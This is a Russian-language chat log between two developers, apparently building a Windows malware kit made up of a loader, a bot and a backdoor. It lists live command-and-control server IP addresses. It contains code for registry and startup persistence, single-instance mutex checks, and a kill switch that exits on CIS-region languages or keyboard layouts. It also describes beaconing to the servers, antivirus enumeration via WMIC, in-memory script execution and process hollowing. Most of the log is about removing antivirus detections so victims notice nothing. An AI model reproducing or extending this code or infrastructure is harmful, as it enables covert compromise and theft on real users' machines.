2020-07-16 08:37:58.005017	mushroom	frog	Бэкдор: https://45.148.120.142:443,https://80.82.68.32:443,https://185.14.31.135:443,https://194.87.145.86:443,https://85.204.116.188:443,https://185.164.32.148:443
2020-07-16 08:38:22.637249	mushroom	frog	Проверяй на них загрузчик и бот комплектом.
2020-07-16 08:57:26.599539	mushroom	frog	Как проверишь пиши.
2020-07-16 14:59:11.567596	mushroom	frog	По поводу проверки комплекта. Запускай загрузчик и все команды пропусти через бот, с помощью админки. Потом перезагрузи компьютер, запуститься сам уже загрузчик, и ещё раз все команды пропусти через бот.
2020-07-16 14:59:26.985459	mushroom	frog	Если всё пройдёт гладко. Напиши мне.
2020-07-16 14:59:52.931832	frog	mushroom	Хорошо
2020-07-16 15:00:29.926765	mushroom	frog	Это с логами и без логов проверь.
2020-07-16 15:24:40.544539	mushroom	frog	В каком файле у тебя адреса сервера находятся?
2020-07-16 15:24:54.094355	mushroom	frog	На GitlAb старые сейчас.
2020-07-16 15:25:10.682730	frog	mushroom	config.h
2020-07-16 15:37:01.508131	frog	mushroom	Скачивать файлы с этих же адресов: "/api/v130"? Пытаюсь скачать файл, получаю строку "null". Хотя на сервере все файлы загрузил
2020-07-16 15:39:08.136137	mushroom	frog	Да с этих. Там надо нажать кнопку с галкой, она возле шестерёнки, "To production" вплывает на ней.
2020-07-16 15:39:24.441341	frog	mushroom	Увидел, спасибо!
2020-07-16 15:40:07.245667	mushroom	frog	Если косяки с загрузкой, а ничего не изменилось, у Talar спрашивай, он серверную часть делает.
2020-07-16 15:55:48.836985	frog	mushroom	Когда exe-файл сохраняю в папку App Data Касперский реагирует. Как с этим быть?
2020-07-16 15:56:06.225697	mushroom	frog	Какой exe файл?
2020-07-16 15:56:20.618154	mushroom	frog	Для команды запуск файла?
2020-07-16 15:56:29.914625	frog	mushroom	загрузчика
2020-07-16 15:56:37.386116	mushroom	frog	При обновлении?
2020-07-16 15:57:17.768657	frog	mushroom	Да, если версии не совпадают, скачиваю и сохраняю туда файл загрузчика
2020-07-16 15:57:25.711591	mushroom	frog	Попробуй в Temp. Если не проходит просканируй его на dyncheck.
2020-07-16 15:57:43.270889	mushroom	frog	И так же найди место, которое палится и измени.
2020-07-16 15:57:50.640277	mushroom	frog	Как ты делал с ботом.
2020-07-17 12:38:51.397289	frog	mushroom	Привет.
Не успел устранить все реакции антивируса. Всё было сделал, но решил скомпилировать боевую версию и антивирус опять увидел угрозу.
В старом resolve_emercoin.h есть что-то опасное (для антивируса) и на get_possible_domain он тоже реагирует. Потому что, если его закомментировать, то всё нормально.
Нужно ещё время. К понедельнику постараюсь всё сделать.
2020-07-17 12:39:57.241068	frog	mushroom	Запуск по цепочке "Загрузчик -> Загрузчик -> Бот" работает нормально.
2020-07-17 12:41:45.955116	frog	mushroom	Как вызывать функцию для добавления в автозапуск addAutostart?
Добавление в реестр сделал, но хотелось бы и в автозапуск тоже попробовать добавиться.
2020-07-17 12:45:51.675312	frog	mushroom	Ещё обратил внимание, что обфускатор строк работает как-то странно.
Пример из модуля anchorange. Вот так работает не правильно:
status = ADVAPI32(RegCreateKeyExW)(currUserKey,  _TSTR(TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &runKey, &disposition);
А так правильно, если скопировать строку:
KERNEL32(lstrcpyW)(sub_key, _TSTR(TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run")));
status = ADVAPI32(RegCreateKeyExW)(currUserKey, sub_key, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &runKey, &disposition);
2020-07-17 12:49:15.570552	frog	mushroom	И такое обстоятельство не могу понять. Запускаю один и то же бот на разных машинах (на Windows 7 и на Windows 10) - один виден в админке (первый), второй не виден, хотя команда NOP приходит на все машины.
2020-07-17 12:50:21.708068	mushroom	frog	Да. Со строками так. Если юникод надо сначала в буфер скопировать lstrcpyW(sub_key, _WCS(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
2020-07-17 12:50:38.213639	mushroom	frog	Если ANSI не надо копировать в промежуточный буфер.
2020-07-17 12:52:39.178350	mushroom	frog	_Success_(return != 0)
BOOL addAutostart(_In_z_ PCWSTR linkName, _In_z_ PCTSTR targetFileName,
    _In_opt_z_ PCTSTR description, _In_opt_z_ PCTSTR workingDir, _In_opt_z_ PCTSTR iconPath,
    _In_opt_ int iconIndex)
2020-07-17 12:52:48.745002	mushroom	frog	Эта фунция имеется ввиду?
2020-07-17 12:53:02.740242	frog	mushroom	Да
2020-07-17 12:53:13.461024	mushroom	frog	А что не понятно.
2020-07-17 12:54:56.723028	mushroom	frog	linjName имя ярлыка, targetFileName имя файла на котороый ярлык указывает, description описания для ярлыка, workingDir рабочая папка для ярлыка, iconPath имя файла иконки для ярлыка, iconIndex индекс картинки в файле ico.
2020-07-17 12:54:58.389377	frog	mushroom	Пробовал так, но не сработало:
addAutostart(L"link.exe", L"D:\\dl7.exe", L"My program", L"D:\\", 0, 0);
И последние 2 параметра не понятны
2020-07-17 12:55:11.411027	mushroom	frog	То что _opt_ можно NULL.
2020-07-17 12:55:41.444504	mushroom	frog	По факту нужно только два первых параметра.
2020-07-17 12:56:00.629531	mushroom	frog	Открой свойства любого ярлыка и посмотри.
2020-07-17 12:56:27.735076	mushroom	frog	У него все эти параметры будут.
2020-07-17 12:57:09.538703	mushroom	frog	Рабочая папка, значёк и т.д.
2020-07-17 12:58:26.458348	mushroom	frog	Смотри строки которые ты передавал первая юникод, все остальные могут быть как юникод, так и ANSI.
2020-07-17 12:58:49.652689	mushroom	frog	У тебя PCTSTR во что превращается?
2020-07-17 12:59:00.311315	mushroom	frog	В PCSTR или PCWSTR?
2020-07-17 12:59:26.255687	frog	mushroom	LPCWSTR
2020-07-17 13:00:20.697886	mushroom	frog	И какая ошибка?
2020-07-17 13:00:30.496809	mushroom	frog	GetLastError что даёт?
2020-07-17 13:00:49.762278	mushroom	frog	И где? В каком месте этой функции?
2020-07-17 13:01:44.735525	mushroom	frog	У тебя и в реестр добавится и в автозапуск. А работать только один будет, который первый запустился?
2020-07-17 13:04:36.772466	frog	mushroom	Разобрался. Нужно было указать расширение lnk. Вот так заработало:
addAutostart(L"link1.lnk", L"D:\\dl7.exe", 0, 0, 0, 0);
Хотел сделать так: добавиться в автозагрузку. Если не получилось добавиться в автозагрузку, то в реестр.
2020-07-17 13:05:23.621286	mushroom	frog	Можно так. Главное чтобы только один экземпляр всегда работал.
2020-07-17 13:06:51.371809	frog	mushroom	Подправил немного функцию addAutostart. Внутри неё нужно ещё вызвать  "OLE32(CoInitialize)(NULL)", иначе не работает.
2020-07-17 13:07:21.974550	mushroom	frog	Да нужно. Не обязательно в ней. Лучше глобально для всей программы.
2020-07-17 13:08:54.398199	frog	mushroom	А можно добавляться и в реестр и в автозапуск? Как тогда синхронизироваться?
2020-07-17 13:14:13.425776	mushroom	frog	Типа так:
#if defined(ONE_INSTANCE_FILE)
    TCHAR homePath[MAX_PATH + 1];
    kernel32.expandEnvironmentStrings(_TSTR(TEXT("%USERPROFILE%")), homePath, _countof(homePath));

    TCHAR oneInstanceFilename[MAX_PATH + 1];
    wsprintf(oneInstanceFilename, _TSTR(TEXT("%s\\%s")), homePath, _TSTR(GLOBAL_APP_CHILD_ID));
    HANDLE oneInstanceChildFile = kernel32.createFile(oneInstanceFilename, GENERIC_READ, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (oneInstanceChildFile == INVALID_HANDLE_VALUE && kernel32.getLastError() == ERROR_FILE_NOT_FOUND)
    {
        debug_printf(TEXT("Child program is already running. Quit\n"));
        waitForMessageBox();
        return 1;
    }

    wsprintf(oneInstanceFilename, _TSTR(TEXT("%s\\%s")), homePath, _TSTR(GLOBAL_APP_ID));
    g_oneInstanceFile = kernel32.createFile(oneInstanceFilename, GENERIC_READ, 0, NULL,
        CREATE_NEW, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL);
    if (g_oneInstanceFile == INVALID_HANDLE_VALUE && kernel32.getLastError() == ERROR_FILE_EXISTS)
    {
        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
        waitForMessageBox();
        return 1;
    }
#elif defined(ONE_INSTANCE_MUTEX)
    HANDLE oneInstanceChildMutex = kernel32.createMutex(NULL, FALSE, _TSTR(GLOBAL_APP_CHILD_ID));
    if (oneInstanceChildMutex)
    {
        if (kernel32.getLastError() == ERROR_ALREADY_EXISTS)
        {
            debug_printf(TEXT("Child program is already running. Quit\n"));
            kernel32.closeHandle(oneInstanceChildMutex);
            waitForMessageBox();
            return 1;
        }

        kernel32.closeHandle(oneInstanceChildMutex);
    }

    g_oneInstanceMutex = kernel32.createMutex(NULL, FALSE, _TSTR(GLOBAL_APP_ID));
    if (g_oneInstanceMutex && kernel32.getLastError() == ERROR_ALREADY_EXISTS)
    {
        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
        kernel32.closeHandle(g_oneInstanceMutex);
        waitForMessageBox();
        return 1;
    }
#elif defined(ONE_INSTANCE_GLOBAL_ATOM)
    ATOM childAtom = kernel32.globalFindAtom(_TSTR(GLOBAL_APP_CHILD_ID));
    if (childAtom)
    {
        debug_printf(TEXT("Child program is already running. Quit\n"));
#ifdef _DEBUG
        kernel32.globalDeleteAtom(childAtom);
#endif // _DEBUG
        waitForMessageBox();
        return 1;
    }

    g_oneInstanceAtom = kernel32.globalFindAtom(_TSTR(GLOBAL_APP_ID));
    if (g_oneInstanceAtom)
    {
        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
#ifdef _DEBUG
        kernel32.globalDeleteAtom(g_oneInstanceAtom);
#endif // _DEBUG
        waitForMessageBox();
        return 1;
    }
    else
        g_oneInstanceAtom = kernel32.globalAddAtom(_TSTR(GLOBAL_APP_ID));
#endif
2020-07-17 13:14:48.840439	mushroom	frog	Первый способ создать файл и открыть его. Другая программа получит ошибку открытия файла, значит одна версия работает уже.
2020-07-17 13:15:23.529202	mushroom	frog	Второй способ создать мьютекс, вторая программа попытается создать мьютекс и получит ошибку что он уже есть.
2020-07-17 13:16:12.511658	mushroom	frog	Третий способ добавить переменную в глобальную таблицу globalatom, вторая попробует прочитает что в этой таблице она уже есть.
2020-07-17 13:18:14.692162	mushroom	frog	Лог пишется у тебя в файл в сборках Release?
2020-07-17 13:18:24.122963	frog	mushroom	Да
2020-07-17 13:18:29.552428	mushroom	frog	Всё проверил как я вчера говорил?
2020-07-17 13:18:46.789083	mushroom	frog	Всё гладко работает?
2020-07-17 13:20:46.666498	frog	mushroom	Выше написал, что ещё нужно найти на что реагирует антивирус в resolve_emercoin.h.
В старом resolve_emercoin.h есть что-то опасное (для антивируса) и на get_possible_domain он тоже реагирует. Потому что, если его закомментировать, то всё нормально.
2020-07-17 13:21:17.248640	frog	mushroom	И такое обстоятельство не могу понять. Запускаю один и то же бот на разных машинах (на Windows 7 и на Windows 10) - один виден в админке (первый), второй не виден, хотя команда NOP приходит на все машины.
2020-07-17 13:21:58.337906	mushroom	frog	Это скорей вскго потому что группа не определилась на сервере.
2020-07-17 13:22:12.570387	mushroom	frog	На Win 10 Server не видит?
2020-07-17 13:23:01.801953	frog	mushroom	Обычная Windows 10.
2020-07-17 13:23:27.753427	mushroom	frog	А как ты куки передаёшь?
2020-07-17 13:24:18.477885	frog	mushroom	m_lstrcpy(szHeaders, _STR("Cookie: group="  GROUP ";"));
(!GET_API(HttpSendRequestA)(hHttpRequest, szHeaders, strlen(szHeaders), nullptr, 0))
2020-07-17 13:24:57.098055	frog	mushroom	#define GROUP "frog"
2020-07-17 13:25:37.696790	mushroom	frog	INTERNET_FLAG_NO_COOKIES используешь в httpOpenRequest?
2020-07-17 13:25:52.310729	mushroom	frog	Если не используешь WinInet твои куки сотрёт.
2020-07-17 13:26:17.355029	frog	mushroom	Да
HINTERNET hHttpRequest = GET_API(HttpOpenRequestA)(
        hHttpSession, _STR("GET"), objectName,
        _STR("HTTP/1.1"), nullptr, nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_COOKIES, (DWORD_PTR)0);
2020-07-17 13:27:03.233686	mushroom	frog	А INTERNET_FLAG_SECURE?
2020-07-17 13:27:11.453450	mushroom	frog	Надо https
2020-07-17 13:27:18.859284	mushroom	frog	Для боевого сервера.
2020-07-17 13:28:20.098875	mushroom	frog	Можешь попробовать сменить id бота. Просто ты мог его запустить раньше с другой группой, и она запомнилась на сервере.
2020-07-17 13:28:32.135367	mushroom	frog	И тебе по этому не виден бот.
2020-07-17 13:28:51.234999	mushroom	frog	Сменить id просто. Измени немного дату создания папки Windows.
2020-07-17 13:29:09.593305	frog	mushroom	Ясно, спасибо
2020-07-17 13:29:48.423516	mushroom	frog	Что осталось доделать получается?
2020-07-17 13:31:14.578737	frog	mushroom	В общем-то разобраться с resolve_emercoin.h, обфусцировать get_possible_domain.
Синхронизацию тогда ещё добавлю.
2020-07-17 13:32:01.163708	mushroom	frog	Давай. В приоритете убрать эти детекты.
2020-07-17 13:32:18.486387	mushroom	frog	Чтобы иожно было отдать тестеру для окончательной проверки.
2020-07-17 13:33:28.503679	frog	mushroom	А почему может быть так: один и тот же код в оконной версии детектируется, а в консольной нет?
2020-07-17 13:33:51.871778	frog	mushroom	При прочих равных условиях
2020-07-17 13:34:41.449091	mushroom	frog	Значит не все равные условия, или антивирус видит что ты хитришь, оконное приложение, а окно не показываешь.
2020-07-17 13:37:59.184987	mushroom	frog	Но я думаю что не все равные условия.
2020-07-20 07:57:15.999310	frog	mushroom	Привет!
Загрузил проекты на gitlab.
2020-07-20 08:12:19.541563	frog	mushroom	Проверил все программы на 2 системах: Windows 7 x64 и Windows 10 x64. Подключался к тестовому серверу. На боевом проверить не успел, но, наверное всё должно работать, только ip-адреса нужно указать в config.h.
В config.h добавил макрос-идентификатор TEST_BUILD. Если он включен, то компилируется тестовая версия, иначе боевая.
Под какими именами закрепляться в системе не придумал, но сделал так, чтобы эти имена можно передавать в командной строке, например:
dl7.exe "Имя_в_реестре" "Имя_в_автозагрузке"
Хотел ещё разобраться с иконками, но не успел.
2020-07-20 08:13:28.068245	mushroom	frog	Привет. А если не указать имена, закрепится?
2020-07-20 08:13:47.053582	frog	mushroom	Да, там есть имена по умолчанию
2020-07-20 08:14:15.541751	mushroom	frog	Проверяй на боевом сервере.
лоадеры
185.99.2.49       
78.108.216.13
217.12.209.44
91.235.129.151 
80.82.68.132
62.108.35.215


бот
85.204.116.188             
80.82.68.32
194.87.145.86
185.14.31.135 
45.148.120.142
62.109.13.184
2020-07-20 08:14:36.086308	mushroom	frog	Если всё гладко, скажу кому отдать на тесты.
2020-07-20 08:14:49.224457	mushroom	frog	Поверяй с логами и без логов.
2020-07-20 08:15:12.355216	frog	mushroom	Хорошо. Т.е. загрузить на боевой сервер 2 комплекта?
2020-07-20 08:16:50.796690	mushroom	frog	Можешь сразу загрузить туда версию без логов. Чтобы запустил загрузчик и пользователь ничего не заметил. Если найдутся косяки какие, загрузишь с логами и посмотришь в чём дело.
2020-07-20 10:03:57.443895	mushroom	frog	Как можно сменить id бота твоего?
2020-07-20 10:05:52.999531	frog	mushroom	В systeminfo.cpp в 56 строчке можно прибавить любое число к секунде или минуте
2020-07-20 10:09:47.742740	mushroom	frog	В сборке Release подключается к тестовому серверу.
2020-07-20 10:09:57.943081	mushroom	frog	Надо к боевому.
2020-07-20 10:11:45.638732	frog	mushroom	Хорошо. В config.h строку с TEST_BUILD можно закомментировать, тогда к боевому подключится.
2020-07-20 10:12:19.674284	mushroom	frog	Надо чтобы так было всегда, тестер будет проверять на боевом сервере. Закоммить это.
2020-07-20 10:17:26.850705	mushroom	frog	Версию бота и загрузчика надо прошить так же как и группу в программах.
2020-07-20 10:20:04.054830	mushroom	frog	Ещё. При подключении к серверу, после его проверки. Надо посылать сообщение в котором указана версия программы и используемый в данный момент адрес. POST /<id>/4 с телом сообщения. Типа Version 0.1 Address 255.255.255.255.
2020-07-20 10:20:52.054830	mushroom	frog	Если произошло переподключение, так же сообщение в котором указывается используемый адрес.
2020-07-20 10:22:02.955778	mushroom	frog	Каждый час работы, надо посылать сообщение в котором указывается время работы бота. Типа Uptime 3600000 мсек.
2020-07-20 10:22:54.295892	mushroom	frog	cname ???
2020-07-20 10:23:12.127692	mushroom	frog	При получении информации о системе.
2020-07-20 10:24:22.471004	mushroom	frog	ip три адреса. Первый это внешний, а второй и третий что означают?
2020-07-20 10:25:33.565821	frog	mushroom	Которые возвращает pgethostbyname.
2020-07-20 10:26:10.993680	mushroom	frog	Это локальные адреса типа?
2020-07-20 10:26:27.697570	frog	mushroom	Да
2020-07-20 10:26:54.241339	mushroom	frog	Они в принципе не нужны. Оставь так пока.
2020-07-20 10:26:57.683759	mushroom	frog	cname ???
2020-07-20 10:27:08.735337	mushroom	frog	Имя компьютера не определилось.
2020-07-20 10:28:02.934419	mushroom	frog	Или передалось с ошибкой. В общем вместо него ???
2020-07-20 10:28:33.405174	frog	mushroom	Посмотрю, может что-то с кодировкой произошло
2020-07-20 10:28:54.729730	mushroom	frog	Hollowing 32 -> 64 работает?
2020-07-20 10:29:19.831864	frog	mushroom	Нет.
2020-07-20 10:29:46.048983	mushroom	frog	Оставляй так пока.
2020-07-20 10:30:06.393036	frog	mushroom	Сомневаюсь, что это возможно вообще
2020-07-20 10:30:06.394208	frog	mushroom	Сомневаюсь, что это возможно вообще
2020-07-20 10:30:29.873292	mushroom	frog	Возможно. Я тебе давал пример processhelper.
2020-07-20 10:31:05.309716	mushroom	frog	Потом будет как доработка. Сейчас главное допилить ошибки.
2020-07-20 10:31:18.381451	frog	mushroom	Из 64-разрядной запустить 32-разрядную можно
2020-07-20 10:31:41.998899	mushroom	frog	Я это имел ввиду.
2020-07-20 10:32:04.233460	frog	mushroom	Это сделано
2020-07-20 10:32:52.268748	mushroom	frog	Антивирус только никогда не определяется Windows Defender у меня.
2020-07-20 10:33:33.614277	mushroom	frog	Standart Output
Standart Error
ОШИБКА.
Описание: Неправильное пространство имен
2020-07-20 10:33:46.341729	mushroom	frog	Это написано там где антивирус.
2020-07-20 10:34:02.781721	frog	mushroom	Антивирус узнаю так:
wmic /namespace:\\root\SecurityCenter path AntivirusProduct get displayName, versionNumber /format:list
2020-07-20 10:34:50.762266	mushroom	frog	Ты когда тестировал на Win 10 антивирус определялся?
2020-07-20 10:35:52.037146	frog	mushroom	Не проверил эту команду. Сейчас посмотрю
2020-07-20 10:36:15.704430	mushroom	frog	95 процентов где будет работать твоя программа это Win 10 64bit.
2020-07-20 10:41:15.641332	frog	mushroom	Тоже не работает
2020-07-20 10:41:26.692074	mushroom	frog	Реши вопрос.
2020-07-20 10:42:14.376185	mushroom	frog	По поводу 3 адресов, всё таки надо убрать и оставить 1. А то сервер, когда 3 адреса значёк страны не отображает в админке.
2020-07-20 10:42:26.447461	mushroom	frog	Оставить надо только внешний.
2020-07-20 10:43:22.739410	mushroom	frog	Я тебе давал пример как антивирус системы получить?
2020-07-20 10:43:36.781949	mushroom	frog	Вроде в самом начале давал.
2020-07-20 10:47:23.442856	frog	mushroom	Да, есть функция "ANTIVIRUSINFOLIST antivirusInfo()"
2020-07-20 10:47:40.241295	frog	mushroom	В info.cpp
2020-07-20 11:05:20.290494	mushroom	frog	Запуск powershell\cmd проверь такой сценарий cd c:\\r\ndir\r\n, у меня в результате получилось не содержимое дика C:\, а содержимое папки с программой.
2020-07-20 11:05:41.824539	mushroom	frog	Это запуск из памяти не сохраняя на диск сценарий.
2020-07-20 11:06:25.520062	mushroom	frog	Ты сценарий из памяти как запускаешь через пайп?
2020-07-20 11:10:26.180234	frog	mushroom	Конечно
2020-07-20 11:10:43.452631	mushroom	frog	cd c:\\r\ndir\r\n попробуй такой.
2020-07-20 11:11:59.764074	mushroom	frog	Получается что две команды отдельно выполняются, а не друг за одной.
2020-07-20 11:12:34.052663	mushroom	frog	Сейчас на своём боте проверю.
2020-07-20 11:15:51.620560	mushroom	frog	У меня диск C:\ содержимое вывелось.
2020-07-20 11:15:59.597190	mushroom	frog	Смотри где у тебя ошибка.
2020-07-20 11:16:34.537863	mushroom	frog	У тебя такое же даже, когда делаешь запуск сценария с сохранением на диск.
2020-07-20 11:17:36.943865	frog	mushroom	Команда такая должна быть: "c:\r\ndir\r\n".
2020-07-20 11:18:05.343940	mushroom	frog	А такая что не может быть cd c:\\r\ndir\r\n
2020-07-20 11:18:20.936738	mushroom	frog	А если мне надо паку сменить.
2020-07-20 11:18:26.422373	mushroom	frog	Папку.
2020-07-20 11:19:33.483605	frog	mushroom	cd на другой локальный диск не переключает
2020-07-20 11:20:01.316489	mushroom	frog	Сейчас проверю с диском D:\ у себя.
2020-07-20 11:21:12.777747	mushroom	frog	Работает.
2020-07-20 11:21:24.252605	mushroom	frog	У тебя ошибка где то.
2020-07-20 11:23:58.688452	mushroom	frog	В PowerShell переключает на другой диск, в cmd нет.
2020-07-20 11:24:11.860423	mushroom	frog	У тебя и в PowerShell не работает.
2020-07-20 11:25:20.175201	mushroom	frog	И если не переключать на другой диск тоже не идут команды по цепочке, как должно быть.
2020-07-20 11:25:34.755814	mushroom	frog	Посмотри в чём загвоздка.
2020-07-20 11:30:09.515737	mushroom	frog	Когда команда terminate process не удалась код ошибки шлёшь в ответе?
2020-07-20 11:31:46.061676	mushroom	frog	Когда успешно смотрю шлёшь Process_successful_terminate:. Ещё туда приписывай то что GetLastError даст, даже если успешно всё прошло. Будет тогда 0. Или просто шли только цифру котоую GetLastError даёт, можно ничего больше не писать.
2020-07-20 11:34:42.275457	mushroom	frog	Всё остальное нормально. Посмотрел.
2020-07-21 08:45:56.789241	frog	mushroom	Привет. Загрузил на gitlab проект бэкдора. Вчерашние замечания исправил. С антивирусником повозиться пришлось. 
Загрузчик немного подправлю и чуть позже загружу
2020-07-21 08:56:48.347078	mushroom	frog	Привет. Хорошо.
2020-07-21 10:38:30.852514	frog	mushroom	Когда загрузчик начал подключать к боевому серверу, антивирус Касперского стал показывать "Trojan-Downloader.Win32.Upatre".
С тестовым такого не было. В общем, разбираюсь
2020-07-21 10:39:21.579804	mushroom	frog	OK. Может адрес в чёрном списке у него.
2020-07-21 13:35:50.846088	frog	mushroom	Длинный список IP-адресов в модуле resolve_emercoin актуальный?
2020-07-21 13:36:34.692070	mushroom	frog	Может уже нет.
2020-07-21 13:39:04.989321	frog	mushroom	Оставить так пока этот список? Или их как-то проверить можно?
В ТЗ написано "немедленный отказ при работе в зоне .ru/СНГ - порезать на бекенде; также проверять наличие русской раскладки."
Это как реализовать?
2020-07-21 13:39:52.562188	mushroom	frog	Проверить раскладки клавиатуры и язык системы.
2020-07-21 13:41:13.716015	mushroom	frog	BOOL isLangForbidden(LANGID lang)
{
    UCHAR primaryLang = lang & 0xff;
    //UCHAR subLanguage = (lang >> 2) & 0xff;

    switch (primaryLang)
    {
    case LANG_RUSSIAN:
    case LANG_AZERBAIJANI:
    case LANG_ARMENIAN:
    case LANG_BELARUSIAN:
    case LANG_KAZAK:
    case LANG_KYRGYZ:
    case LANG_ROMANIAN:
    case LANG_TAJIK:
    case LANG_UZBEK:
    case LANG_GEORGIAN:
    case LANG_UKRAINIAN:
    case LANG_TURKMEN:
        return TRUE;
    }

    return FALSE;
}

BOOL forbiddenLocale()
{
    BOOL result = FALSE;

    LANGID sysDefaultLang = kernel32.getSystemDefaultLangID();
    result = isLangForbidden(sysDefaultLang);
    if (!result)
    {
        int hklCount = user32.getKeyboardLayoutList(0, NULL);
        HKL* hklList = (HKL*)HeapAlloc(GetProcessHeap(), 0, hklCount * sizeof(HKL));
        if (hklList)
        {
            user32.getKeyboardLayoutList(hklCount, hklList);
            for (int i = 0; i < hklCount && !result; ++i)
                result = isLangForbidden(*((WORD*)(&hklList[i])) & 0xffff);

            HeapFree(GetProcessHeap(), 0, hklList);
        }
    }

    return result;
}
2020-07-21 14:30:08.261311	frog	mushroom	В модуле info.h есть вызовы из Api-ms-win-core-version-l1-1-0.dll. Их тоже обфусцировать?
2020-07-21 14:30:38.927711	mushroom	frog	Нет.
2020-07-21 14:30:42.093355	frog	mushroom	Это для получения версии exe-файла антивируса
2020-07-21 14:31:01.951386	mushroom	frog	Или можешь придумать свой вариант.
2020-07-21 15:09:16.901626	frog	mushroom	"is suspected of Trojan.Downloader.gen.s" - это что может быть?
2020-07-21 15:09:50.321268	mushroom	frog	Это для загрузчика?
2020-07-21 15:13:16.250452	mushroom	frog	Функции или их последовательность в программе, которые скачивают и сохраняют файл скорей всего.
2020-07-21 15:13:23.554044	frog	mushroom	У бота иногда появляется (это статическая проверка на dyncheck.com, антивирус VBA32). Причём как-то странно: иногда показывает, иногда нет. Закомментирую какую-нибудь строчку случайную, которая вообще не относится ни к чему, или напишу лишнюю - пропадёт детект. Потом опять появится.
2020-07-21 15:14:13.385993	mushroom	frog	Последовательность функций какая то характерная для этого антивируса наверное.
2020-07-21 15:14:19.148948	mushroom	frog	Это для x64?
2020-07-21 15:14:40.032980	frog	mushroom	Нет, для x86
2020-07-21 15:15:31.952239	mushroom	frog	Для x64 нету такого?
2020-07-21 15:15:47.099304	frog	mushroom	Нет
2020-07-21 15:15:59.574925	mushroom	frog	Если нет пока оставляй, x64 используют.
2020-07-21 15:25:27.198106	frog	mushroom	Не успел доделать загрузчик. Долго ловил один детект. Антивирусу Касперского не нравился вызов CoCreateInstance для создания ярлыка в автозагрузке. Пришлось разбираться, чем заменить вызов этой функции. 
Имена ссылок в реестре и в автозагрузке, наверное, пропишу в config.h
2020-07-21 15:30:13.040532	mushroom	frog	Антивирусам не нравиться когда программы лезут в автозагрузку.
2020-07-21 15:36:41.640295	frog	mushroom	Текущую версию загрузчика загрузил на gitlab. Позже ещё добавлю проверку языка и проверю работу загрузчика на Windows 10
2020-07-21 15:37:50.418834	mushroom	frog	Хорошо.
2020-07-22 11:02:32.880404	mushroom	frog	Привет. Информация о системе, моя система определилась как Win 8, а у меня Win 10.
2020-07-23 05:57:56.392508	mushroom	frog	Привет. Информация о системе, моя система определилась как Win 8, а у меня Win 10.
2020-07-23 08:39:02.705749	mushroom	frog	Привет. Вчера смотрел всё вроде работает. Ты всё доделал?
2020-07-23 08:51:37.828460	frog	mushroom	Привет. Загрузил оба проекта на gitlab. Подправил определение версии ОС. Добавил определение локализации. Устранил некоторые ошибки и детекты.
2020-07-23 08:53:23.655665	mushroom	frog	Готовь версии с логами и без логов. И отдавай на тестирование bentley.
2020-07-23 08:53:32.811463	mushroom	frog	Добавь его себе.
2020-07-23 08:53:41.907273	frog	mushroom	Он есть у меня
2020-07-23 08:53:54.233204	mushroom	frog	Он протестирует на разных машинах ис разными антивирусами.
2020-07-23 08:54:02.551858	mushroom	frog	Тгда отдавай ему.
2020-07-23 08:54:44.519953	mushroom	frog	С этого момента каждая новая сборка увеличиваешь версию, которая прошита в боте и загрузчике.
2020-07-23 11:16:22.596906	mushroom	frog	Отдал bentley?
2020-07-23 11:16:45.437714	mushroom	frog	Когда отдашь скажешь.
2020-07-23 11:24:13.252875	frog	mushroom	Отдал
2020-07-23 11:25:47.336687	mushroom	frog	OK. Он тебе скажет какие детекты были (если были), исправишь. Ну и ошибки если всплывут. Нам надо чтобы не было ни одного детекта у антивирусов которыми он будет проверять твой комплект.
2020-07-28 10:50:35.439877	mushroom	frog	Привет. Что там с тестированием?
2020-07-28 10:51:48.052402	frog	mushroom	Привет. Жду результатов. Bentley пока не ответил.
2020-07-28 10:54:15.157239	mushroom	frog	На dyncheck динамику проверял?
2020-07-28 10:55:27.817509	frog	mushroom	Не проверял. Только статическую проверку делал.
2020-07-28 10:55:37.959825	mushroom	frog	Там надо только лоадер проверить.
2020-07-28 10:56:00.835585	mushroom	frog	Посмотри, потом скажи что как.
2020-07-28 10:56:50.785013	frog	mushroom	У меня там кол-во попыток проверки истекло(
Не знал, что там ограничение есть
2020-07-28 10:57:34.177678	mushroom	frog	Как это? У нас же одна учётная запись, я проверяю.
2020-07-28 10:57:48.283428	mushroom	frog	А через прокси если зайти.
2020-07-28 11:20:22.430005	frog	mushroom	Проверил 32-разрядную версию. 6 антивирусников негативно отреагировали. Некоторые говорят Gen:Variant.Fugrafa.68463
2020-07-28 11:21:48.035058	mushroom	frog	Подробности смотри, что пишут. Там половина из них наверное негативно реагируют на то что программа в интернет лезет это не считается.
2020-07-28 11:24:24.914136	frog	mushroom	https://dyncheck.com/scan/id/820a6c6c61889af6e2683da13f0e065d
2020-07-28 11:28:38.658076	mushroom	frog	Нормально в принципе. Ждём тогда когда, админку починят чтобы там уже окончательно протестировать с антивирусами, которые нас интересуют.
2020-07-28 11:28:56.485302	mushroom	frog	Можешь пока посмотреть что значит fugrafa.
2020-07-28 11:30:16.578644	frog	mushroom	Хорошо. Он уже был у меня. Пытался его поймать. Заметил только, что он появляется, когда тело функции main пустое или там несущественные инструкции.
2020-07-29 08:22:55.935640	mushroom	frog	Привет что по тестированию?
2020-07-29 08:23:45.044468	frog	mushroom	Привет. Пока ничего не сообщали
2020-07-29 08:29:02.948707	mushroom	frog	Какие там адреса сейчас в бэкдор и в загрузчике?
2020-07-29 08:35:32.254479	frog	mushroom	Бэкдор
85.204.116.188
80.82.68.32
194.87.145.86
185.14.31.135
45.148.120.142
62.109.13.184
2020-07-29 08:36:14.232184	frog	mushroom	Загрузчик
185.99.2.49
217.12.209.44
91.235.129.151
80.82.68.132
62.108.35.215
78.108.216.13
2020-07-29 08:39:08.338273	mushroom	frog	OK. В основном все живые адреса.
